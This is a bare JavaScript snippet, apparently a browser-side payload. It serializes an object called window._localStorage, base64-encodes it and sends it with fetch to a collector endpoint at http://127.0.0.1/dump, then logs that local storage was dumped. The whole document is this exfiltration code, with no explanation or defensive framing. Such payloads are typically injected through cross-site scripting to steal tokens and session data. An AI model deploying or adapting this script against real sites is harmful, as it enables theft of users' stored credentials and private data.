(() => {
    const lsDump = JSON.stringify(window._localStorage);

    fetch('http://127.0.0.1/dump?data=' + encodeURIComponent(btoa(lsDump)), 
        {
            method: 'GET',
        }).then(() => {
        console.log('Local Storage Dumped');
    }).catch((err) => { console.log(err) });
})();